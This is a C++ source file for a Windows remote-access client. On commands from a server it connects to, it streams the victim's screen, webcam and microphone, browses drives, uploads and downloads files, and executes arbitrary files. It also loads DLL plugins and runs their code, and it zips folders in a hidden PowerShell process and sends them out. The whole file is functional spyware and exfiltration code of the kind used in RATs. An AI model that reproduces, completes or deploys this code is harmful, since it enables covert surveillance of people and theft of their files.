#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <stdio.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")

using namespace Gdiplus;

// --- Configuration ---
const char* SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 1234;
const char* MUTEX_STRING = "xeno_native_mutex";

// --- Globals ---
CRITICAL_SECTION sendCS;
SOCKET currentSock = INVALID_SOCKET;
bool isConnected = false;
HWND hHiddenWindow;
NOTIFYICONDATAA nid;

volatile bool isStreamingRdp = false;
volatile bool isStreamingCam = false;
volatile bool isStreamingMic = false;
int currentCamIndex = 0; 

#define WM_TRAYICON (WM_USER + 1)
#define IDM_TRAY_STATUS 3001
#define IDM_TRAY_RECONNECT 3002
#define IDM_TRAY_EXIT 3003

// --- Network & Transfer Helpers ---
bool SendAll(SOCKET sock, const char* buffer, int size) {
    int total = 0;
    while (total < size) {
        int sent = send(sock, buffer + total, size - total, 0);
        if (sent <= 0) return false;
        total += sent;
    }
    return true;
}

void SendStatus(const char* statusStr) {
    if (currentSock == INVALID_SOCKET) return;
    EnterCriticalSection(&sendCS);
    BYTE cmd = 0x06; 
    DWORD len = (DWORD)strlen(statusStr);
    send(currentSock, (char*)&cmd, 1, 0);
    send(currentSock, (char*)&len, 4, 0);
    send(currentSock, statusStr, len, 0);
    LeaveCriticalSection(&sendCS);
}

bool RecvFileToDisk(SOCKET sock, const char* destPath, DWORD fileSize) {
    FILE* f = fopen(destPath, "wb");
    char buffer[8192];
    DWORD total = 0;
    
    while (total < fileSize) {
        int toRead = sizeof(buffer);
        if (fileSize - total < toRead) toRead = fileSize - total;
        
        int bytes = recv(sock, buffer, toRead, 0);
        if (bytes <= 0) break; 
        
        if (f) fwrite(buffer, 1, bytes, f);
        total += bytes;
    }
    
    if (f) fclose(f);
    return (total == fileSize); 
}

bool SendFileFromDisk(SOCKET sock, const char* srcPath) {
    FILE* f = fopen(srcPath, "rb");
    if (!f) return false;
    
    char buffer[8192];
    int bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), f)) > 0) {
        int totalSent = 0;
        while(totalSent < bytesRead) {
            int sent = send(sock, buffer + totalSent, bytesRead - totalSent, 0);
            if (sent <= 0) { fclose(f); return false; } 
            totalSent += sent;
        }
    }
    fclose(f);
    return true;
}

DWORD GetFileSizeOnDisk(const char* path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    DWORD size = GetFileSize(hFile, NULL);
    CloseHandle(hFile);
    return size;
}

// --- Plugin Subsystem ---
typedef void (WINAPI *CFT_lspInitialize)();

void LoadAndExecutePlugin(const char* dllPath) {
    HMODULE hPlugin = LoadLibraryA(dllPath);
    if (hPlugin) {
        CFT_lspInitialize pInit = (CFT_lspInitialize)GetProcAddress(hPlugin, "lspInitialize");
        if (pInit) {
            SendStatus("Plugin Loaded and Initialized Successfully.");
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pInit, NULL, 0, NULL);
        } else {
            SendStatus("Plugin Loaded, but lspInitialize export not found.");
        }
    } else {
        SendStatus("Failed to Load Plugin DLL.");
    }
}

// --- File System Handlers ---
void HandleGetDrives() {
    char driveStr[256] = {0};
    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char root[4];
            sprintf(root, "%c:\\|", 'A' + i);
            strcat(driveStr, root);
        }
    }
    
    EnterCriticalSection(&sendCS);
    BYTE cmd = 0x22; 
    DWORD len = (DWORD)strlen(driveStr);
    send(currentSock, (char*)&cmd, 1, 0);
    send(currentSock, (char*)&len, 4, 0);
    SendAll(currentSock, driveStr, len);
    LeaveCriticalSection(&sendCS);
}

void HandleGetDirectory(const char* path) {
    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*", path);
    
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath, &fd);
    
    char* resultBuf = (char*)malloc(1024 * 1024); 
    resultBuf[0] = '\0';
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                char entry[MAX_PATH + 64];
                const char* type = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "DIR" : "FILE";
                DWORD size = (fd.nFileSizeHigh * (MAXDWORD + 1)) + fd.nFileSizeLow;
                sprintf(entry, "%s|%s|%lu\n", type, fd.cFileName, size);
                strcat(resultBuf, entry);
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    } else {
        strcpy(resultBuf, "ACCESS_DENIED\n");
    }
    
    EnterCriticalSection(&sendCS);
    BYTE cmd = 0x22; 
    DWORD len = (DWORD)strlen(resultBuf);
    send(currentSock, (char*)&cmd, 1, 0);
    send(currentSock, (char*)&len, 4, 0);
    SendAll(currentSock, resultBuf, len);
    LeaveCriticalSection(&sendCS);
    free(resultBuf);
}

// --- GDI+ Helper ---
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid; free(pImageCodecInfo); return j;
        }
    }
    free(pImageCodecInfo); return -1;
}

// --- RDP Capture ---
bool CaptureScreenToMemory(BYTE** outBuffer, DWORD* outSize) {
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreenDC = GetDC(NULL), hMemDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);
    SetStretchBltMode(hMemDC, HALFTONE);
    BitBlt(hMemDC, 0, 0, w, h, hScreenDC, 0, 0, SRCCOPY | CAPTUREBLT);

    Bitmap* bmp = new Bitmap(hBitmap, NULL);
    IStream* pStream = NULL; CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    CLSID jpgClsid; GetEncoderClsid(L"image/jpeg", &jpgClsid);
    
    EncoderParameters params; params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality; params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1; ULONG quality = 40; params.Parameter[0].Value = &quality;

    bmp->Save(pStream, &jpgClsid, &params);
    HGLOBAL hGlobal = NULL; GetHGlobalFromStream(pStream, &hGlobal);
    *outSize = GlobalSize(hGlobal); *outBuffer = (BYTE*)malloc(*outSize);
    memcpy(*outBuffer, GlobalLock(hGlobal), *outSize);
    GlobalUnlock(hGlobal); pStream->Release(); delete bmp;
    SelectObject(hMemDC, hOldBitmap); DeleteObject(hBitmap); DeleteDC(hMemDC); ReleaseDC(NULL, hScreenDC);
    return true;
}

DWORD WINAPI StreamDesktopThread(LPVOID lpParam) {
    SendStatus("Streaming Remote Desktop...");
    while (isStreamingRdp && currentSock != INVALID_SOCKET) {
        BYTE* imgData = NULL; DWORD imgSize = 0;
        if (CaptureScreenToMemory(&imgData, &imgSize)) {
            EnterCriticalSection(&sendCS);
            BYTE cmd = 0x02; send(currentSock, (char*)&cmd, 1, 0); send(currentSock, (char*)&imgSize, 4, 0);
            SendAll(currentSock, (char*)imgData, imgSize);
            LeaveCriticalSection(&sendCS); free(imgData);
        }
        Sleep(60);
    }
    SendStatus("Idling...");
    return 0;
}

// --- Webcam Capture (Media Foundation Engine) ---
DWORD WINAPI StreamCamThread(LPVOID lpParam) {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    SendStatus("Initializing Media Foundation...");

    IMFAttributes* pConfig = NULL;
    MFCreateAttributes(&pConfig, 1);
    pConfig->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);

    IMFActivate** ppDevices = NULL;
    UINT32 count = 0;
    
    if (FAILED(MFEnumDeviceSources(pConfig, &ppDevices, &count)) || count <= currentCamIndex) {
        SendStatus("Requested Webcam Device Not Found.");
        isStreamingCam = false;
        if(pConfig) pConfig->Release();
        CoUninitialize();
        return 0;
    }

    WCHAR* szFriendlyName = NULL;
    ppDevices[currentCamIndex]->GetAllocatedString(MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME, &szFriendlyName, NULL);
    char nameMb[128] = "Unknown";
    if (szFriendlyName) {
        WideCharToMultiByte(CP_UTF8, 0, szFriendlyName, -1, nameMb, 128, NULL, NULL);
        CoTaskMemFree(szFriendlyName);
    }

    IMFMediaSource* pSource = NULL;
    if (FAILED(ppDevices[currentCamIndex]->ActivateObject(IID_PPV_ARGS(&pSource)))) {
        SendStatus("Failed to activate webcam hardware.");
        isStreamingCam = false;
        for(UINT32 i = 0; i < count; i++) ppDevices[i]->Release();
        CoTaskMemFree(ppDevices);
        pConfig->Release();
        CoUninitialize();
        return 0;
    }
    
    for(UINT32 i = 0; i < count; i++) ppDevices[i]->Release();
    CoTaskMemFree(ppDevices);

    IMFAttributes* pReaderConfig = NULL;
    MFCreateAttributes(&pReaderConfig, 1);
    pReaderConfig->SetUINT32(MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING, TRUE);

    IMFSourceReader* pReader = NULL;
    if (FAILED(MFCreateSourceReaderFromMediaSource(pSource, pReaderConfig, &pReader))) {
        SendStatus("Failed to create MF Source Reader.");
        isStreamingCam = false;
    }
    pReaderConfig->Release();
    pConfig->Release();

    if (!isStreamingCam) { pSource->Release(); CoUninitialize(); return 0; }

    IMFMediaType* pType = NULL;
    MFCreateMediaType(&pType);
    pType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
    pType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB32);
    
    if (FAILED(pReader->SetCurrentMediaType((DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType))) {
        SendStatus("Webcam stream format conversion failed.");
        isStreamingCam = false;
    }
    pType->Release();

    if (!isStreamingCam) { pReader->Release(); pSource->Release(); CoUninitialize(); return 0; }

    IMFMediaType* pCurrentType = NULL;
    pReader->GetCurrentMediaType((DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pCurrentType);
    UINT32 width = 0, height = 0;
    MFGetAttributeSize(pCurrentType, MF_MT_FRAME_SIZE, &width, &height);
    pCurrentType->Release();

    char statusMsg[256];
    sprintf(statusMsg, "Streaming Webcam (%s)...", nameMb);
    SendStatus(statusMsg);

    CLSID jpgClsid; GetEncoderClsid(L"image/jpeg", &jpgClsid);
    EncoderParameters params; params.Count = 1; 
    params.Parameter[0].Guid = EncoderQuality; params.Parameter[0].Type = EncoderParameterValueTypeLong; 
    params.Parameter[0].NumberOfValues = 1; ULONG quality = 45; params.Parameter[0].Value = &quality;

    while (isStreamingCam && currentSock != INVALID_SOCKET) {
        IMFSample* pSample = NULL;
        DWORD streamFlags = 0;
        
        HRESULT hr = pReader->ReadSample((DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, NULL, &streamFlags, NULL, &pSample);
        
        if (SUCCEEDED(hr) && pSample) {
            IMFMediaBuffer* pBuffer = NULL;
            pSample->ConvertToContiguousBuffer(&pBuffer);
            BYTE* pData = NULL;
            DWORD cbData = 0;
            pBuffer->Lock(&pData, NULL, &cbData);

            if (cbData >= width * height * 4) {
                Bitmap* bmp = new Bitmap(width, height, width * 4, PixelFormat32bppRGB, pData);
                if (bmp->GetLastStatus() == Ok) {
                    bmp->RotateFlip(RotateNoneFlipY); 

                    IStream* pStream = NULL; 
                    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
                    bmp->Save(pStream, &jpgClsid, &params);
                    
                    HGLOBAL hGlobal = NULL; GetHGlobalFromStream(pStream, &hGlobal);
                    DWORD imgSize = GlobalSize(hGlobal); 
                    
                    if (imgSize > 0) {
                        BYTE* imgData = (BYTE*)malloc(imgSize);
                        memcpy(imgData, GlobalLock(hGlobal), imgSize);
                        GlobalUnlock(hGlobal); 

                        EnterCriticalSection(&sendCS);
                        BYTE cmd = 0x04; 
                        send(currentSock, (char*)&cmd, 1, 0); 
                        send(currentSock, (char*)&imgSize, 4, 0);
                        SendAll(currentSock, (char*)imgData, imgSize);
                        LeaveCriticalSection(&sendCS); 
                        free(imgData);
                    }
                    pStream->Release(); 
                }
                delete bmp;
            }
            pBuffer->Unlock();
            pBuffer->Release();
            pSample->Release();
        }
        Sleep(40); 
    }

    pReader->Release();
    pSource->Shutdown();
    pSource->Release();

    if (!isStreamingRdp && !isStreamingMic) SendStatus("Idling...");
    CoUninitialize();
    return 0;
}

// --- Microphone Capture ---
HWAVEIN hWaveIn;
WAVEHDR waveHdr[4];

void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    if (uMsg == WIM_DATA && isStreamingMic) {
        PWAVEHDR pWaveHdr = (PWAVEHDR)dwParam1;
        if (pWaveHdr->dwBytesRecorded > 0) {
            EnterCriticalSection(&sendCS);
            BYTE cmd = 0x05; 
            send(currentSock, (char*)&cmd, 1, 0);
            send(currentSock, (char*)&pWaveHdr->dwBytesRecorded, 4, 0);
            send(currentSock, pWaveHdr->lpData, pWaveHdr->dwBytesRecorded, 0);
            LeaveCriticalSection(&sendCS);
        }
        waveInAddBuffer(hwi, pWaveHdr, sizeof(WAVEHDR));
    }
}

DWORD WINAPI StreamMicThread(LPVOID lpParam) {
    SendStatus("Streaming Microphone...");
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, sizeof(WAVEFORMATEX)};
    waveInOpen(&hWaveIn, WAVE_MAPPER, &wfx, (DWORD_PTR)waveInProc, 0, CALLBACK_FUNCTION);
    
    for (int i = 0; i < 4; i++) {
        waveHdr[i].lpData = (LPSTR)malloc(11025);
        waveHdr[i].dwBufferLength = 11025;
        waveInPrepareHeader(hWaveIn, &waveHdr[i], sizeof(WAVEHDR));
        waveInAddBuffer(hWaveIn, &waveHdr[i], sizeof(WAVEHDR));
    }
    
    waveInStart(hWaveIn);
    while(isStreamingMic) Sleep(100);
    waveInStop(hWaveIn);
    waveInReset(hWaveIn);
    
    for (int i = 0; i < 4; i++) {
        waveInUnprepareHeader(hWaveIn, &waveHdr[i], sizeof(WAVEHDR));
        free(waveHdr[i].lpData);
    }
    waveInClose(hWaveIn);
    if (!isStreamingRdp && !isStreamingCam) SendStatus("Idling...");
    return 0;
}

// --- Networking Thread ---
DWORD WINAPI NetworkLoopThread(LPVOID lpParam) {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    while (true) {
        currentSock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server = {AF_INET, htons(SERVER_PORT)}; 
        server.sin_addr.s_addr = inet_addr(SERVER_IP);

        if (connect(currentSock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            isConnected = true;
            SendStatus("Connected & Idling...");
            
            BYTE cmd;
            while (recv(currentSock, (char*)&cmd, 1, 0) > 0) {
                if (cmd == 0x10 && !isStreamingRdp) { isStreamingRdp = true; CreateThread(NULL, 0, StreamDesktopThread, NULL, 0, NULL); }
                else if (cmd == 0x11) { isStreamingRdp = false; }
                else if (cmd == 0x13) { isStreamingCam = false; }
                else if (cmd == 0x14 && !isStreamingMic) { isStreamingMic = true; CreateThread(NULL, 0, StreamMicThread, NULL, 0, NULL); }
                else if (cmd == 0x15) { isStreamingMic = false; }
                else if (cmd == 0x16) { 
                    char listBuf[1024] = {0};
                    IMFAttributes* pConfig = NULL;
                    MFCreateAttributes(&pConfig, 1);
                    pConfig->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
                    
                    IMFActivate** ppDevices = NULL;
                    UINT32 count = 0;
                    
                    if (SUCCEEDED(MFEnumDeviceSources(pConfig, &ppDevices, &count))) {
                        for (UINT32 i = 0; i < count; i++) {
                            WCHAR* szFriendlyName = NULL;
                            if (SUCCEEDED(ppDevices[i]->GetAllocatedString(MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME, &szFriendlyName, NULL))) {
                                char temp[256]; char nameMb[128];
                                WideCharToMultiByte(CP_UTF8, 0, szFriendlyName, -1, nameMb, 128, NULL, NULL);
                                sprintf(temp, "%d|%s\n", i, nameMb);
                                strcat(listBuf, temp);
                                CoTaskMemFree(szFriendlyName);
                            }
                            ppDevices[i]->Release();
                        }
                        CoTaskMemFree(ppDevices);
                    }
                    pConfig->Release();
                    
                    if (strlen(listBuf) == 0) strcpy(listBuf, "None");
                    
                    EnterCriticalSection(&sendCS);
                    BYTE outCmd = 0x07; 
                    DWORD listLen = (DWORD)strlen(listBuf);
                    send(currentSock, (char*)&outCmd, 1, 0);
                    send(currentSock, (char*)&listLen, 4, 0);
                    send(currentSock, listBuf, listLen, 0);
                    LeaveCriticalSection(&sendCS);
                }
                else if (cmd == 0x17) {
                    int targetIdx = 0;
                    if (recv(currentSock, (char*)&targetIdx, 4, 0) == 4) {
                        if (isStreamingCam) { isStreamingCam = false; Sleep(300); }
                        currentCamIndex = targetIdx; isStreamingCam = true;
                        CreateThread(NULL, 0, StreamCamThread, NULL, 0, NULL);
                    }
                }
                else if (cmd == 0x20) { HandleGetDrives(); }
                else if (cmd == 0x21 || cmd == 0x23 || cmd == 0x30 || cmd == 0x24 || cmd == 0x27) {
                    DWORD len = 0;
                    if (recv(currentSock, (char*)&len, 4, 0) == 4 && len > 0 && len < MAX_PATH) {
                        char path[MAX_PATH] = {0};
                        recv(currentSock, path, len, 0);
                        path[len] = '\0';
                        
                        if (cmd == 0x21) HandleGetDirectory(path);
                        else if (cmd == 0x23) ShellExecuteA(NULL, "open", path, NULL, NULL, SW_SHOW);
                        else if (cmd == 0x30) LoadAndExecutePlugin(path);
                        
                        else if (cmd == 0x24) { 
                            DWORD fSize = GetFileSizeOnDisk(path);
                            if (fSize > 0) {
                                const char* justName = strrchr(path, '\\');
                                justName = justName ? justName + 1 : path;
                                DWORD nameLen = (DWORD)strlen(justName);
                                
                                EnterCriticalSection(&sendCS);
                                BYTE outCmd = 0x25; 
                                send(currentSock, (char*)&outCmd, 1, 0);
                                send(currentSock, (char*)&nameLen, 4, 0);
                                send(currentSock, justName, nameLen, 0);
                                send(currentSock, (char*)&fSize, 4, 0);
                                SendFileFromDisk(currentSock, path); 
                                LeaveCriticalSection(&sendCS);
                            }
                        }
                        
                        else if (cmd == 0x27) {
                            char zipPath[MAX_PATH];
                            GetTempPathA(MAX_PATH, zipPath);
                            strcat(zipPath, "remote_dir_export.zip");
                            
                            DeleteFileA(zipPath); 
                            
                            char psCmd[1024];
                            sprintf(psCmd, "powershell.exe -WindowStyle Hidden -Command \"Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force\"", path, zipPath);
                            
                            STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
                            si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
                            if (CreateProcessA(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                                WaitForSingleObject(pi.hProcess, 60000); 
                                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                            }
                            
                            DWORD fSize = GetFileSizeOnDisk(zipPath);
                            if (fSize > 0) {
                                const char* justName = strrchr(path, '\\'); 
                                justName = justName ? justName + 1 : path;
                                
                                char finalZipName[MAX_PATH];
                                sprintf(finalZipName, "%s.zip", justName);
                                DWORD nameLen = (DWORD)strlen(finalZipName);
                                
                                EnterCriticalSection(&sendCS);
                                BYTE outCmd = 0x25; 
                                send(currentSock, (char*)&outCmd, 1, 0);
                                send(currentSock, (char*)&nameLen, 4, 0);
                                send(currentSock, finalZipName, nameLen, 0);
                                send(currentSock, (char*)&fSize, 4, 0);
                                SendFileFromDisk(currentSock, zipPath);
                                LeaveCriticalSection(&sendCS);
                                
                                DeleteFileA(zipPath); 
                            }
                        }
                    }
                }
                else if (cmd == 0x26) {
                    DWORD pathLen = 0;
                    if (recv(currentSock, (char*)&pathLen, 4, 0) == 4 && pathLen > 0 && pathLen < MAX_PATH) {
                        char destPath[MAX_PATH] = {0};
                        recv(currentSock, destPath, pathLen, 0);
                        destPath[pathLen] = '\0';
                        
                        DWORD fileSize = 0;
                        recv(currentSock, (char*)&fileSize, 4, 0);
                        
                        RecvFileToDisk(currentSock, destPath, fileSize);
                    }
                }
                else if (cmd == 0x98) { break; }
                else if (cmd == 0x99) { Shell_NotifyIconA(NIM_DELETE, &nid); ExitProcess(0); }
            }
        }
        
        isConnected = false;
        isStreamingRdp = isStreamingCam = isStreamingMic = false;
        closesocket(currentSock); currentSock = INVALID_SOCKET; Sleep(2000); 
    }
    
    CoUninitialize(); return 0;
}

// --- Tray Icon Window Procedure ---
LRESULT CALLBACK HiddenWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_TRAYICON: {
            if (lParam == WM_RBUTTONUP || lParam == WM_LBUTTONUP) {
                HMENU hMenu = CreatePopupMenu();
                
                if (isConnected) {
                    AppendMenuA(hMenu, MF_STRING | MF_DISABLED, IDM_TRAY_STATUS, "Status: Connected to Server");
                } else {
                    AppendMenuA(hMenu, MF_STRING | MF_DISABLED, IDM_TRAY_STATUS, "Status: Disconnected / Retrying...");
                }
                
                AppendMenuA(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuA(hMenu, MF_STRING, IDM_TRAY_RECONNECT, "Force Reconnect");
                AppendMenuA(hMenu, MF_STRING, IDM_TRAY_EXIT, "Exit Client");

                SetForegroundWindow(hwnd);
                POINT pt; GetCursorPos(&pt);
                TrackPopupMenu(hMenu, TPM_RIGHTBUTTON | TPM_BOTTOMALIGN, pt.x, pt.y, 0, hwnd, NULL);
                DestroyMenu(hMenu);
            }
            return 0;
        }
        case WM_COMMAND: {
            if (LOWORD(wParam) == IDM_TRAY_RECONNECT) {
                if (currentSock != INVALID_SOCKET) closesocket(currentSock); 
            }
            else if (LOWORD(wParam) == IDM_TRAY_EXIT) {
                Shell_NotifyIconA(NIM_DELETE, &nid);
                ExitProcess(0);
            }
            return 0;
        }
        case WM_DESTROY:
            Shell_NotifyIconA(NIM_DELETE, &nid);
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

void CheckMutex() {
    CreateMutexA(NULL, TRUE, MUTEX_STRING);
    if (GetLastError() == ERROR_ALREADY_EXISTS) ExitProcess(0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    CheckMutex();
    InitializeCriticalSection(&sendCS);
    
    MFStartup(MF_VERSION);
    
    GdiplusStartupInput gdiplusStartupInput; 
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    WSADATA wsa; 
    WSAStartup(MAKEWORD(2, 2), &wsa);

    WNDCLASSEXA wc = { sizeof(WNDCLASSEXA), 0, HiddenWndProc, 0, 0, hInstance, NULL, NULL, NULL, NULL, "HiddenTrayClass", NULL };
    RegisterClassExA(&wc);
    hHiddenWindow = CreateWindowExA(0, "HiddenTrayClass", "", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);

    ZeroMemory(&nid, sizeof(NOTIFYICONDATAA));
    nid.cbSize = sizeof(NOTIFYICONDATAA);
    nid.hWnd = hHiddenWindow;
    nid.uID = 1;
    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_TRAYICON;
    nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    strcpy(nid.szTip, "Native C Client Service");
    Shell_NotifyIconA(NIM_ADD, &nid);

    CreateThread(NULL, 0, NetworkLoopThread, NULL, 0, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    MFShutdown();
    GdiplusShutdown(gdiplusToken); 
    DeleteCriticalSection(&sendCS); 
    WSACleanup(); 
    return 0;
}